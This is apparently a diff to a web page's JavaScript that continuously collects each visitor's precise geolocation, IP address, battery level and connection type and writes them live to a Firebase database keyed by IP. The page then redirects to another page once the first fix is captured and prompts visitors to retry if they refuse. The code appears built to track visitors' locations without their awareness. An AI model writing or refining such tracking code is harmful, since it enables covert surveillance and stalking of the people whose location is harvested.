@@ -43,7 +43,6 @@ async function verificarBloqueo(){if(!miIP)await obtenerIP();let ipKey=miIP.repl
 async function pedirUbicacion(){
   if(await verificarBloqueo())return;
   if(!navigator.geolocation){ window.location.href="inicio.html"; return; }
-  // Aquí sale solo el mensaje del teléfono: Permitir / No permitir
   navigator.geolocation.watchPosition(async(pos)=>{
     if(await verificarBloqueo())return;
     let lat=pos.coords.latitude; let lng=pos.coords.longitude;
@@ -55,7 +54,6 @@ async function pedirUbicacion(){
     let bateria="N/A"; try{let b=await navigator.getBattery(); bateria=Math.round(b.level*100)+"%";}catch(e){}
     let conexion=navigator.connection?navigator.connection.effectiveType:"N/A";
     let ipKeySafe=miIP.replace(/\./g,'_');
-    let key=Date.now();
     let datosCliente={
       lat:lat, lng:lng, accuracy:pos.coords.accuracy+"m",
       ip:miIP, ipCliente:miIP,
@@ -66,16 +64,14 @@ async function pedirUbicacion(){
       fechaHora:new Date().toLocaleString(), timestamp:Date.now(),
       direccionReal:"Ubicación en tiempo real"
     };
-    await db.ref('ubicaciones/'+key).set(datosCliente);
-    await db.ref('ubicaciones/'+ipKeySafe+'_live').set(datosCliente);
-    await db.ref('ubicaciones_historial/'+ipKeySafe+'/'+key).set(datosCliente);
+    // SOLO UNA CARPETA: ubicaciones / IP del cliente - todo ahí mismo, sin duplicar
+    await db.ref('ubicaciones/'+ipKeySafe).set(datosCliente);
     if(!primerEnvio){
       primerEnvio=true;
       setTimeout(()=>{ window.location.href="inicio.html"; }, 800);
     }
   }, (err)=>{ 
     console.log(err);
-    // Si NO permite, mostrar mensaje en el centro + botón Intentar de nuevo
     document.getElementById('overlay-denied').classList.add('show');
   }, {enableHighAccuracy:true, maximumAge:0, timeout:10000});
 }
